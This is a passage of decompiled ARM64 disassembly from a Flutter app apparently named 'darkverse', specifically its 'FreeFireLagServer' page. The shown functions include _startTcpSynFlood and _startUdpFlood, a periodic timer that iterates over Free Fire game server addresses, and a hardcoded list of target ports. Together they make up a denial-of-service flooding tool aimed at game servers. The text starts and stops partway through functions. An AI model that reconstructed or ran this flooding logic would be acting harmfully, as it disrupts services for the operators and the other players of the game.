    // 0x87d144: mov             x1, x0
    // 0x87d148: r0 = _growToNextCapacity()
    //     0x87d148: bl              #0x4578a8  ; [dart:core] _GrowableList::_growToNextCapacity
    // 0x87d14c: ldur            x0, [fp, #-0xe8]
    // 0x87d150: ldur            x2, [fp, #-0xd8]
    // 0x87d154: add             x1, x2, #1
    // 0x87d158: lsl             x3, x1, #1
    // 0x87d15c: StoreField: r0->field_b = r3
    //     0x87d15c: stur            w3, [x0, #0xb]
    // 0x87d160: LoadField: r1 = r0->field_f
    //     0x87d160: ldur            w1, [x0, #0xf]
    // 0x87d164: DecompressPointer r1
    //     0x87d164: add             x1, x1, HEAP, lsl #32
    // 0x87d168: ldur            x0, [fp, #-0xd0]
    // 0x87d16c: ArrayStore: r1[r2] = r0  ; List_4
    //     0x87d16c: add             x25, x1, x2, lsl #2
    //     0x87d170: add             x25, x25, #0xf
    //     0x87d174: str             w0, [x25]
    //     0x87d178: tbz             w0, #0, #0x87d194
    //     0x87d17c: ldurb           w16, [x1, #-1]
    //     0x87d180: ldurb           w17, [x0, #-1]
    //     0x87d184: and             x16, x17, x16, lsr #2
    //     0x87d188: tst             x16, HEAP, lsr #32
    //     0x87d18c: b.eq            #0x87d194
    //     0x87d190: bl              #0xbf5df0  ; ArrayWriteBarrierStub
    // 0x87d194: r0 = _nextSeed()
    //     0x87d194: bl              #0x49d0d8  ; [dart:math] _Random::_nextSeed
    // 0x87d198: mvn             x1, x0
    // 0x87d19c: lsl             x2, x0, #0x15
    // 0x87d1a0: add             x0, x1, x2
    // 0x87d1a4: lsr             x1, x0, #0x18
    // 0x87d1a8: eor             x2, x0, x1
    // 0x87d1ac: r16 = 265
    //     0x87d1ac: mov             x16, #0x109
    // 0x87d1b0: mul             x0, x2, x16
    // 0x87d1b4: lsr             x1, x0, #0xe
    // 0x87d1b8: eor             x2, x0, x1
    // 0x87d1bc: r16 = 21
    //     0x87d1bc: mov             x16, #0x15
    // 0x87d1c0: mul             x0, x2, x16
    // 0x87d1c4: lsr             x1, x0, #0x1c
    // 0x87d1c8: eor             x2, x0, x1
    // 0x87d1cc: lsl             x0, x2, #0x1f
    // 0x87d1d0: add             x1, x2, x0
    // 0x87d1d4: cbnz            x1, #0x87d1e0
    // 0x87d1d8: r0 = 23063
    //     0x87d1d8: mov             x0, #0x5a17
    // 0x87d1dc: b               #0x87d1e4
    // 0x87d1e0: mov             x0, x1
    // 0x87d1e4: stur            x0, [fp, #-0xd8]
    // 0x87d1e8: r0 = _Random()
    //     0x87d1e8: bl              #0x49d0cc  ; Allocate_RandomStub -> _Random (size=0x10)
    // 0x87d1ec: mov             x2, x0
    // 0x87d1f0: ldur            x0, [fp, #-0xd8]
    // 0x87d1f4: stur            x2, [fp, #-0xe0]
    // 0x87d1f8: StoreField: r2->field_7 = r0
    //     0x87d1f8: stur            x0, [x2, #7]
    // 0x87d1fc: mov             x1, x2
    // 0x87d200: r0 = _nextState()
    //     0x87d200: bl              #0x49cf64  ; [dart:math] _Random::_nextState
    // 0x87d204: ldur            x1, [fp, #-0xe0]
    // 0x87d208: r0 = _nextState()
    //     0x87d208: bl              #0x49cf64  ; [dart:math] _Random::_nextState
    // 0x87d20c: ldur            x1, [fp, #-0xe0]
    // 0x87d210: r0 = _nextState()
    //     0x87d210: bl              #0x49cf64  ; [dart:math] _Random::_nextState
    // 0x87d214: ldur            x1, [fp, #-0xe0]
    // 0x87d218: r0 = _nextState()
    //     0x87d218: bl              #0x49cf64  ; [dart:math] _Random::_nextState
    // 0x87d21c: ldur            x1, [fp, #-0xe0]
    // 0x87d220: r0 = _nextState()
    //     0x87d220: bl              #0x49cf64  ; [dart:math] _Random::_nextState
    // 0x87d224: ldur            x0, [fp, #-0xe0]
    // 0x87d228: LoadField: r1 = r0->field_7
    //     0x87d228: ldur            x1, [x0, #7]
    // 0x87d22c: ubfx            x1, x1, #0, #0x20
    // 0x87d230: and             w0, w1, #0xff
    // 0x87d234: stur            x0, [fp, #-0xd8]
    // 0x87d238: r1 = <int>
    //     0x87d238: ldr             x1, [PP, #0xed0]  ; [pp+0xed0] TypeArguments: <int>
    // 0x87d23c: r2 = 16384
    //     0x87d23c: mov             x2, #0x4000
    // 0x87d240: r0 = AllocateArray()
    //     0x87d240: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x87d244: mov             x1, x0
    // 0x87d248: ldur            x0, [fp, #-0xd8]
    // 0x87d24c: lsl             w2, w0, #1
    // 0x87d250: r0 = 0
    //     0x87d250: mov             x0, #0
    // 0x87d254: CheckStackOverflow
    //     0x87d254: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87d258: cmp             SP, x16
    //     0x87d25c: b.ls            #0x87d3b4
    // 0x87d260: cmp             x0, #2, lsl #12
    // 0x87d264: b.ge            #0x87d27c
    // 0x87d268: ArrayStore: r1[r0] = r2  ; Unknown_4
    //     0x87d268: add             x3, x1, x0, lsl #2
    //     0x87d26c: stur            w2, [x3, #0xf]
    // 0x87d270: add             x3, x0, #1
    // 0x87d274: mov             x0, x3
    // 0x87d278: b               #0x87d254
    // 0x87d27c: ldur            x0, [fp, #-0xd0]
    // 0x87d280: r2 = LoadClassIdInstr(r0)
    //     0x87d280: ldur            x2, [x0, #-1]
    //     0x87d284: ubfx            x2, x2, #0xc, #0x14
    // 0x87d288: mov             x16, x1
    // 0x87d28c: mov             x1, x2
    // 0x87d290: mov             x2, x16
    // 0x87d294: mov             x16, x0
    // 0x87d298: mov             x0, x1
    // 0x87d29c: mov             x1, x16
    // 0x87d2a0: r0 = GDT[cid_x0 + 0xf48]()
    //     0x87d2a0: add             lr, x0, #0xf48
    //     0x87d2a4: ldr             lr, [x21, lr, lsl #3]
    //     0x87d2a8: blr             lr
    // 0x87d2ac: r0 = LoadStaticField(0xd70)
    //     0x87d2ac: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87d2b0: ldr             x0, [x0, #0x1ae0]
    // 0x87d2b4: r1 = LoadInt32Instr(r0)
    //     0x87d2b4: sbfx            x1, x0, #1, #0x1f
    //     0x87d2b8: tbz             w0, #0, #0x87d2c0
    //     0x87d2bc: ldur            x1, [x0, #7]
    // 0x87d2c0: add             x2, x1, #1
    // 0x87d2c4: r0 = BoxInt64Instr(r2)
    //     0x87d2c4: sbfiz           x0, x2, #1, #0x1f
    //     0x87d2c8: cmp             x2, x0, asr #1
    //     0x87d2cc: b.eq            #0x87d2d8
    //     0x87d2d0: bl              #0xbf7e54  ; AllocateMintSharedWithoutFPURegsStub
    //     0x87d2d4: stur            x2, [x0, #7]
    // 0x87d2d8: mov             x2, x0
    // 0x87d2dc: StoreStaticField(0xd70, r2)
    //     0x87d2dc: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87d2e0: str             x2, [x0, #0x1ae0]
    // 0x87d2e4: ldur            x2, [fp, #-0xc8]
    // 0x87d2e8: r1 = Function '<anonymous closure>': static.
    //     0x87d2e8: add             x1, PP, #0x3c, lsl #12  ; [pp+0x3c200] AnonymousClosure: static (0x87d3bc), in [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::_startTcpSynFlood (0x87cda8)
    //     0x87d2ec: ldr             x1, [x1, #0x200]
    // 0x87d2f0: r0 = AllocateClosure()
    //     0x87d2f0: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x87d2f4: str             x0, [SP]
    // 0x87d2f8: r1 = <Null?>
    //     0x87d2f8: ldr             x1, [PP, #0x880]  ; [pp+0x880] TypeArguments: <Null?>
    // 0x87d2fc: r2 = Instance_Duration
    //     0x87d2fc: add             x2, PP, #0x15, lsl #12  ; [pp+0x15308] Obj!Duration@a44231
    //     0x87d300: ldr             x2, [x2, #0x308]
    // 0x87d304: r4 = const [0, 0x3, 0x1, 0x3, null]
    //     0x87d304: ldr             x4, [PP, #0xb20]  ; [pp+0xb20] List(5) [0, 0x3, 0x1, 0x3, Null]
    // 0x87d308: r0 = Future.delayed()
    //     0x87d308: bl              #0x50479c  ; [dart:async] Future::Future.delayed
    // 0x87d30c: b               #0x87d314
    // 0x87d310: sub             SP, fp, #0xf0
    // 0x87d314: ldur            x5, [fp, #-0xb0]
    // 0x87d318: ldur            x2, [fp, #-0xa8]
    // 0x87d31c: ldur            x3, [fp, #-0xc0]
    // 0x87d320: ldur            x4, [fp, #-0xb8]
    // 0x87d324: b               #0x87d00c
    // 0x87d328: mov             x0, x3
    // 0x87d32c: StoreField: r0->field_1f = rNULL
    //     0x87d32c: stur            NULL, [x0, #0x1f]
    // 0x87d330: ldur            x5, [fp, #-0xb0]
    // 0x87d334: ldur            x2, [fp, #-0x88]
    // 0x87d338: ldur            x3, [fp, #-0xa0]
    // 0x87d33c: ldur            x4, [fp, #-0x98]
    // 0x87d340: b               #0x87cf3c
    // 0x87d344: mov             x0, x3
    // 0x87d348: StoreField: r0->field_1f = rNULL
    //     0x87d348: stur            NULL, [x0, #0x1f]
    // 0x87d34c: r0 = Null
    //     0x87d34c: mov             x0, NULL
    // 0x87d350: r0 = ReturnAsyncNotFuture()
    //     0x87d350: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x87d354: mov             x0, x2
    // 0x87d358: r0 = ConcurrentModificationError()
    //     0x87d358: bl              #0x4576a0  ; AllocateConcurrentModificationErrorStub -> ConcurrentModificationError (size=0x10)
    // 0x87d35c: mov             x1, x0
    // 0x87d360: ldur            x0, [fp, #-0xa8]
    // 0x87d364: StoreField: r1->field_b = r0
    //     0x87d364: stur            w0, [x1, #0xb]
    // 0x87d368: mov             x0, x1
    // 0x87d36c: r0 = Throw()
    //     0x87d36c: bl              #0xbf5dcc  ; ThrowStub
    // 0x87d370: brk             #0
    // 0x87d374: mov             x0, x2
    // 0x87d378: r0 = ConcurrentModificationError()
    //     0x87d378: bl              #0x4576a0  ; AllocateConcurrentModificationErrorStub -> ConcurrentModificationError (size=0x10)
    // 0x87d37c: mov             x1, x0
    // 0x87d380: ldur            x0, [fp, #-0x88]
    // 0x87d384: StoreField: r1->field_b = r0
    //     0x87d384: stur            w0, [x1, #0xb]
    // 0x87d388: mov             x0, x1
    // 0x87d38c: r0 = Throw()
    //     0x87d38c: bl              #0xbf5dcc  ; ThrowStub
    // 0x87d390: brk             #0
    // 0x87d394: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87d394: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87d398: b               #0x87cecc
    // 0x87d39c: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87d39c: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87d3a0: b               #0x87cf4c
    // 0x87d3a4: r0 = RangeErrorSharedWithoutFPURegs()
    //     0x87d3a4: bl              #0xbf8204  ; RangeErrorSharedWithoutFPURegsStub
    // 0x87d3a8: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87d3a8: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87d3ac: b               #0x87d01c
    // 0x87d3b0: r0 = RangeErrorSharedWithoutFPURegs()
    //     0x87d3b0: bl              #0xbf8204  ; RangeErrorSharedWithoutFPURegsStub
    // 0x87d3b4: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87d3b4: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87d3b8: b               #0x87d260
  }
  [closure] static Null <anonymous closure>(dynamic) {
    // ** addr: 0x87d3bc, size: 0x8c
    // 0x87d3bc: EnterFrame
    //     0x87d3bc: stp             fp, lr, [SP, #-0x10]!
    //     0x87d3c0: mov             fp, SP
    // 0x87d3c4: AllocStack(0x8)
    //     0x87d3c4: sub             SP, SP, #8
    // 0x87d3c8: SetupParameters([dynamic _ /* r0 */])
    //     0x87d3c8: ldr             x0, [fp, #0x10]
    //     0x87d3cc: ldur            w1, [x0, #0x17]
    //     0x87d3d0: add             x1, x1, HEAP, lsl #32
    // 0x87d3d4: CheckStackOverflow
    //     0x87d3d4: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87d3d8: cmp             SP, x16
    //     0x87d3dc: b.ls            #0x87d440
    // 0x87d3e0: LoadField: r2 = r1->field_f
    //     0x87d3e0: ldur            w2, [x1, #0xf]
    // 0x87d3e4: DecompressPointer r2
    //     0x87d3e4: add             x2, x2, HEAP, lsl #32
    // 0x87d3e8: stur            x2, [fp, #-8]
    // 0x87d3ec: r0 = LoadClassIdInstr(r2)
    //     0x87d3ec: ldur            x0, [x2, #-1]
    //     0x87d3f0: ubfx            x0, x0, #0xc, #0x14
    // 0x87d3f4: mov             x1, x2
    // 0x87d3f8: r0 = GDT[cid_x0 + -0xfcf]()
    //     0x87d3f8: sub             lr, x0, #0xfcf
    //     0x87d3fc: ldr             lr, [x21, lr, lsl #3]
    //     0x87d400: blr             lr
    // 0x87d404: r0 = LoadStaticField(0xd80)
    //     0x87d404: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87d408: ldr             x0, [x0, #0x1b00]
    // 0x87d40c: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x87d410: cmp             w0, w16
    // 0x87d414: b.ne            #0x87d424
    // 0x87d418: r2 = _tcpSockets
    //     0x87d418: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3be78] Field <_FreeFireLagServerPageState@829239838._tcpSockets@829239838>: static late (offset: 0xd80)
    //     0x87d41c: ldr             x2, [x2, #0xe78]
    // 0x87d420: r0 = InitLateStaticField()
    //     0x87d420: bl              #0xbf5cf4  ; InitLateStaticFieldStub
    // 0x87d424: mov             x1, x0
    // 0x87d428: ldur            x2, [fp, #-8]
    // 0x87d42c: r0 = remove()
    //     0x87d42c: bl              #0x51ee4c  ; [dart:core] _GrowableList::remove
    // 0x87d430: r0 = Null
    //     0x87d430: mov             x0, NULL
    // 0x87d434: LeaveFrame
    //     0x87d434: mov             SP, fp
    //     0x87d438: ldp             fp, lr, [SP], #0x10
    // 0x87d43c: ret
    //     0x87d43c: ret             
    // 0x87d440: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87d440: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87d444: b               #0x87d3e0
  }
  static List<int> ports() {
    // ** addr: 0x87d448, size: 0xb4
    // 0x87d448: EnterFrame
    //     0x87d448: stp             fp, lr, [SP, #-0x10]!
    //     0x87d44c: mov             fp, SP
    // 0x87d450: AllocStack(0x8)
    //     0x87d450: sub             SP, SP, #8
    // 0x87d454: r0 = 28
    //     0x87d454: mov             x0, #0x1c
    // 0x87d458: mov             x2, x0
    // 0x87d45c: r1 = <int>
    //     0x87d45c: ldr             x1, [PP, #0xed0]  ; [pp+0xed0] TypeArguments: <int>
    // 0x87d460: r0 = AllocateArray()
    //     0x87d460: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x87d464: stur            x0, [fp, #-8]
    // 0x87d468: r16 = 160
    //     0x87d468: mov             x16, #0xa0
    // 0x87d46c: StoreField: r0->field_f = r16
    //     0x87d46c: stur            w16, [x0, #0xf]
    // 0x87d470: r16 = 886
    //     0x87d470: mov             x16, #0x376
    // 0x87d474: StoreField: r0->field_13 = r16
    //     0x87d474: stur            w16, [x0, #0x13]
    // 0x87d478: r16 = 16160
    //     0x87d478: mov             x16, #0x3f20
    // 0x87d47c: ArrayStore: r0[0] = r16  ; List_4
    //     0x87d47c: stur            w16, [x0, #0x17]
    // 0x87d480: r16 = 16886
    //     0x87d480: mov             x16, #0x41f6
    // 0x87d484: StoreField: r0->field_1b = r16
    //     0x87d484: stur            w16, [x0, #0x1b]
    // 0x87d488: r16 = 10444
    //     0x87d488: mov             x16, #0x28cc
    // 0x87d48c: StoreField: r0->field_1f = r16
    //     0x87d48c: stur            w16, [x0, #0x1f]
    // 0x87d490: r16 = 10446
    //     0x87d490: mov             x16, #0x28ce
    // 0x87d494: StoreField: r0->field_23 = r16
    //     0x87d494: stur            w16, [x0, #0x23]
    // 0x87d498: r16 = 10456
    //     0x87d498: mov             x16, #0x28d8
    // 0x87d49c: StoreField: r0->field_27 = r16
    //     0x87d49c: stur            w16, [x0, #0x27]
    // 0x87d4a0: r16 = 10460
    //     0x87d4a0: mov             x16, #0x28dc
    // 0x87d4a4: StoreField: r0->field_2b = r16
    //     0x87d4a4: stur            w16, [x0, #0x2b]
    // 0x87d4a8: r16 = 20002
    //     0x87d4a8: mov             x16, #0x4e22
    // 0x87d4ac: StoreField: r0->field_2f = r16
    //     0x87d4ac: stur            w16, [x0, #0x2f]
    // 0x87d4b0: r16 = 20004
    //     0x87d4b0: mov             x16, #0x4e24
    // 0x87d4b4: StoreField: r0->field_33 = r16
    //     0x87d4b4: stur            w16, [x0, #0x33]
    // 0x87d4b8: r16 = 40002
    //     0x87d4b8: mov             x16, #0x9c42
    // 0x87d4bc: StoreField: r0->field_37 = r16
    //     0x87d4bc: stur            w16, [x0, #0x37]
    // 0x87d4c0: r16 = 40004
    //     0x87d4c0: mov             x16, #0x9c44
    // 0x87d4c4: StoreField: r0->field_3b = r16
    //     0x87d4c4: stur            w16, [x0, #0x3b]
    // 0x87d4c8: r16 = 60002
    //     0x87d4c8: mov             x16, #0xea62
    // 0x87d4cc: StoreField: r0->field_3f = r16
    //     0x87d4cc: stur            w16, [x0, #0x3f]
    // 0x87d4d0: r16 = 60004
    //     0x87d4d0: mov             x16, #0xea64
    // 0x87d4d4: StoreField: r0->field_43 = r16
    //     0x87d4d4: stur            w16, [x0, #0x43]
    // 0x87d4d8: r1 = <int>
    //     0x87d4d8: ldr             x1, [PP, #0xed0]  ; [pp+0xed0] TypeArguments: <int>
    // 0x87d4dc: r0 = AllocateGrowableArray()
    //     0x87d4dc: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x87d4e0: ldur            x1, [fp, #-8]
    // 0x87d4e4: StoreField: r0->field_f = r1
    //     0x87d4e4: stur            w1, [x0, #0xf]
    // 0x87d4e8: r1 = 28
    //     0x87d4e8: mov             x1, #0x1c
    // 0x87d4ec: StoreField: r0->field_b = r1
    //     0x87d4ec: stur            w1, [x0, #0xb]
    // 0x87d4f0: LeaveFrame
    //     0x87d4f0: mov             SP, fp
    //     0x87d4f4: ldp             fp, lr, [SP], #0x10
    // 0x87d4f8: ret
    //     0x87d4f8: ret             
  }
  static void _startUdpFlood() {
    // ** addr: 0x87d4fc, size: 0xf0
    // 0x87d4fc: EnterFrame
    //     0x87d4fc: stp             fp, lr, [SP, #-0x10]!
    //     0x87d500: mov             fp, SP
    // 0x87d504: AllocStack(0x18)
    //     0x87d504: sub             SP, SP, #0x18
    // 0x87d508: CheckStackOverflow
    //     0x87d508: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87d50c: cmp             SP, x16
    //     0x87d510: b.ls            #0x87d5e4
    // 0x87d514: r1 = Function '<anonymous closure>': static.
    //     0x87d514: add             x1, PP, #0x3c, lsl #12  ; [pp+0x3c208] AnonymousClosure: static (0x87d5ec), in [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::_startUdpFlood (0x87d4fc)
    //     0x87d518: ldr             x1, [x1, #0x208]
    // 0x87d51c: r2 = Null
    //     0x87d51c: mov             x2, NULL
    // 0x87d520: r0 = AllocateClosure()
    //     0x87d520: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x87d524: mov             x3, x0
    // 0x87d528: r1 = Null
    //     0x87d528: mov             x1, NULL
    // 0x87d52c: r2 = Instance_Duration
    //     0x87d52c: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3bea8] Obj!Duration@a44471
    //     0x87d530: ldr             x2, [x2, #0xea8]
    // 0x87d534: r0 = Timer.periodic()
    //     0x87d534: bl              #0x570930  ; [dart:async] Timer::Timer.periodic
    // 0x87d538: stur            x0, [fp, #-8]
    // 0x87d53c: r0 = LoadStaticField(0xd74)
    //     0x87d53c: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87d540: ldr             x0, [x0, #0x1ae8]
    // 0x87d544: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x87d548: cmp             w0, w16
    // 0x87d54c: b.ne            #0x87d55c
    // 0x87d550: r2 = _timers
    //     0x87d550: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3be60] Field <_FreeFireLagServerPageState@829239838._timers@829239838>: static late (offset: 0xd74)
    //     0x87d554: ldr             x2, [x2, #0xe60]
    // 0x87d558: r0 = InitLateStaticField()
    //     0x87d558: bl              #0xbf5cf4  ; InitLateStaticFieldStub
    // 0x87d55c: stur            x0, [fp, #-0x18]
    // 0x87d560: LoadField: r1 = r0->field_b
    //     0x87d560: ldur            w1, [x0, #0xb]
    // 0x87d564: LoadField: r2 = r0->field_f
    //     0x87d564: ldur            w2, [x0, #0xf]
    // 0x87d568: DecompressPointer r2
    //     0x87d568: add             x2, x2, HEAP, lsl #32
    // 0x87d56c: LoadField: r3 = r2->field_b
    //     0x87d56c: ldur            w3, [x2, #0xb]
    // 0x87d570: r2 = LoadInt32Instr(r1)
    //     0x87d570: sbfx            x2, x1, #1, #0x1f
    // 0x87d574: stur            x2, [fp, #-0x10]
    // 0x87d578: r1 = LoadInt32Instr(r3)
    //     0x87d578: sbfx            x1, x3, #1, #0x1f
    // 0x87d57c: cmp             x2, x1
    // 0x87d580: b.ne            #0x87d58c
    // 0x87d584: mov             x1, x0
    // 0x87d588: r0 = _growToNextCapacity()
    //     0x87d588: bl              #0x4578a8  ; [dart:core] _GrowableList::_growToNextCapacity
    // 0x87d58c: ldur            x2, [fp, #-0x18]
    // 0x87d590: ldur            x3, [fp, #-0x10]
    // 0x87d594: add             x4, x3, #1
    // 0x87d598: lsl             x5, x4, #1
    // 0x87d59c: StoreField: r2->field_b = r5
    //     0x87d59c: stur            w5, [x2, #0xb]
    // 0x87d5a0: LoadField: r1 = r2->field_f
    //     0x87d5a0: ldur            w1, [x2, #0xf]
    // 0x87d5a4: DecompressPointer r1
    //     0x87d5a4: add             x1, x1, HEAP, lsl #32
    // 0x87d5a8: ldur            x0, [fp, #-8]
    // 0x87d5ac: ArrayStore: r1[r3] = r0  ; List_4
    //     0x87d5ac: add             x25, x1, x3, lsl #2
    //     0x87d5b0: add             x25, x25, #0xf
    //     0x87d5b4: str             w0, [x25]
    //     0x87d5b8: tbz             w0, #0, #0x87d5d4
    //     0x87d5bc: ldurb           w16, [x1, #-1]
    //     0x87d5c0: ldurb           w17, [x0, #-1]
    //     0x87d5c4: and             x16, x17, x16, lsr #2
    //     0x87d5c8: tst             x16, HEAP, lsr #32
    //     0x87d5cc: b.eq            #0x87d5d4
    //     0x87d5d0: bl              #0xbf5df0  ; ArrayWriteBarrierStub
    // 0x87d5d4: r0 = Null
    //     0x87d5d4: mov             x0, NULL
    // 0x87d5d8: LeaveFrame
    //     0x87d5d8: mov             SP, fp
    //     0x87d5dc: ldp             fp, lr, [SP], #0x10
    // 0x87d5e0: ret
    //     0x87d5e0: ret             
    // 0x87d5e4: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87d5e4: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87d5e8: b               #0x87d514
  }
  [closure] static Future<void> <anonymous closure>(dynamic, Timer) async {
    // ** addr: 0x87d5ec, size: 0x638
    // 0x87d5ec: EnterFrame
    //     0x87d5ec: stp             fp, lr, [SP, #-0x10]!
    //     0x87d5f0: mov             fp, SP
    // 0x87d5f4: AllocStack(0x110)
    //     0x87d5f4: sub             SP, SP, #0x110
    // 0x87d5f8: SetupParameters(dynamic _ /* r1 */)
    //     0x87d5f8: stur            NULL, [fp, #-8]
    //     0x87d5fc: mov             x0, #0
    //     0x87d600: add             x1, fp, w0, sxtw #2
    //     0x87d604: ldr             x1, [x1, #0x18]
    //     0x87d608: ldur            w2, [x1, #0x17]
    //     0x87d60c: add             x2, x2, HEAP, lsl #32
    //     0x87d610: stur            x2, [fp, #-0x90]
    // 0x87d614: CheckStackOverflow
    //     0x87d614: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87d618: cmp             SP, x16
    //     0x87d61c: b.ls            #0x87dbf8
    // 0x87d620: InitAsync() -> Future<void?>
    //     0x87d620: ldr             x0, [PP, #0x360]  ; [pp+0x360] TypeArguments: <void?>
    //     0x87d624: bl              #0x4a3fd4  ; InitAsyncStub
    // 0x87d628: r0 = LoadStaticField(0xd6c)
    //     0x87d628: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87d62c: ldr             x0, [x0, #0x1ad8]
    // 0x87d630: tbz             w0, #4, #0x87d63c
    // 0x87d634: r0 = Null
    //     0x87d634: mov             x0, NULL
    // 0x87d638: r0 = ReturnAsyncNotFuture()
    //     0x87d638: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x87d63c: r0 = LoadStaticField(0xd84)
    //     0x87d63c: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87d640: ldr             x0, [x0, #0x1b08]
    // 0x87d644: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x87d648: cmp             w0, w16
    // 0x87d64c: b.ne            #0x87d65c
    // 0x87d650: r2 = freefireServers
    //     0x87d650: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3bd98] Field <_FreeFireLagServerPageState@829239838.freefireServers>: static late final (offset: 0xd84)
    //     0x87d654: ldr             x2, [x2, #0xd98]
    // 0x87d658: r0 = InitLateFinalStaticField()
    //     0x87d658: bl              #0xbf5c8c  ; InitLateFinalStaticFieldStub
    // 0x87d65c: r1 = <String>
    //     0x87d65c: ldr             x1, [PP, #0x3e0]  ; [pp+0x3e0] TypeArguments: <String>
    // 0x87d660: stur            x0, [fp, #-0x98]
    // 0x87d664: r0 = ListIterator()
    //     0x87d664: bl              #0x49a80c  ; AllocateListIteratorStub -> ListIterator<X0> (size=0x24)
    // 0x87d668: mov             x3, x0
    // 0x87d66c: ldur            x2, [fp, #-0x98]
    // 0x87d670: stur            x3, [fp, #-0xb0]
    // 0x87d674: StoreField: r3->field_b = r2
    //     0x87d674: stur            w2, [x3, #0xb]
    // 0x87d678: LoadField: r0 = r2->field_b
    //     0x87d678: ldur            w0, [x2, #0xb]
    // 0x87d67c: r4 = LoadInt32Instr(r0)
    //     0x87d67c: sbfx            x4, x0, #1, #0x1f
    // 0x87d680: stur            x4, [fp, #-0xa8]
    // 0x87d684: StoreField: r3->field_f = r4
    //     0x87d684: stur            x4, [x3, #0xf]
    // 0x87d688: ArrayStore: r3[0] = rZR  ; List_8
    //     0x87d688: stur            xzr, [x3, #0x17]
    // 0x87d68c: ldur            x5, [fp, #-0x90]
    // 0x87d690: stur            x5, [fp, #-0xa0]
    // 0x87d694: CheckStackOverflow
    //     0x87d694: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87d698: cmp             SP, x16
    //     0x87d69c: b.ls            #0x87dc00
    // 0x87d6a0: LoadField: r0 = r2->field_b
    //     0x87d6a0: ldur            w0, [x2, #0xb]
    // 0x87d6a4: r1 = LoadInt32Instr(r0)
    //     0x87d6a4: sbfx            x1, x0, #1, #0x1f
    // 0x87d6a8: cmp             x4, x1
    // 0x87d6ac: b.ne            #0x87dbd8
    // 0x87d6b0: ArrayLoad: r6 = r3[0]  ; List_8
    //     0x87d6b0: ldur            x6, [x3, #0x17]
    // 0x87d6b4: cmp             x6, x1
    // 0x87d6b8: b.ge            #0x87db94
    // 0x87d6bc: mov             x0, x1
    // 0x87d6c0: mov             x1, x6
    // 0x87d6c4: cmp             x1, x0
    // 0x87d6c8: b.hs            #0x87dc08
    // 0x87d6cc: LoadField: r0 = r2->field_f
    //     0x87d6cc: ldur            w0, [x2, #0xf]
    // 0x87d6d0: DecompressPointer r0
    //     0x87d6d0: add             x0, x0, HEAP, lsl #32
    // 0x87d6d4: ArrayLoad: r1 = r0[r6]  ; Unknown_4
    //     0x87d6d4: add             x16, x0, x6, lsl #2
    //     0x87d6d8: ldur            w1, [x16, #0xf]
    // 0x87d6dc: DecompressPointer r1
    //     0x87d6dc: add             x1, x1, HEAP, lsl #32
    // 0x87d6e0: mov             x0, x1
    // 0x87d6e4: stur            x1, [fp, #-0x90]
    // 0x87d6e8: StoreField: r3->field_1f = r0
    //     0x87d6e8: stur            w0, [x3, #0x1f]
    //     0x87d6ec: ldurb           w16, [x3, #-1]
    //     0x87d6f0: ldurb           w17, [x0, #-1]
    //     0x87d6f4: and             x16, x17, x16, lsr #2
    //     0x87d6f8: tst             x16, HEAP, lsr #32
    //     0x87d6fc: b.eq            #0x87d704
    //     0x87d700: bl              #0xbf6274  ; WriteBarrierWrappersStub
    // 0x87d704: add             x0, x6, #1
    // 0x87d708: ArrayStore: r3[0] = r0  ; List_8
    //     0x87d708: stur            x0, [x3, #0x17]
    // 0x87d70c: r0 = LoadStaticField(0xd88)
    //     0x87d70c: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87d710: ldr             x0, [x0, #0x1b10]
    // 0x87d714: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x87d718: cmp             w0, w16
    // 0x87d71c: b.ne            #0x87d72c
    // 0x87d720: r2 = ports
    //     0x87d720: add             x2, PP, #0x3c, lsl #12  ; [pp+0x3c1f8] Field <_FreeFireLagServerPageState@829239838.ports>: static late final (offset: 0xd88)
    //     0x87d724: ldr             x2, [x2, #0x1f8]
    // 0x87d728: r0 = InitLateFinalStaticField()
    //     0x87d728: bl              #0xbf5c8c  ; InitLateFinalStaticFieldStub
    // 0x87d72c: mov             x1, x0
    // 0x87d730: r2 = 8
    //     0x87d730: mov             x2, #8
    // 0x87d734: r0 = take()
    //     0x87d734: bl              #0x563e30  ; [dart:collection] ListBase::take
    // 0x87d738: mov             x1, x0
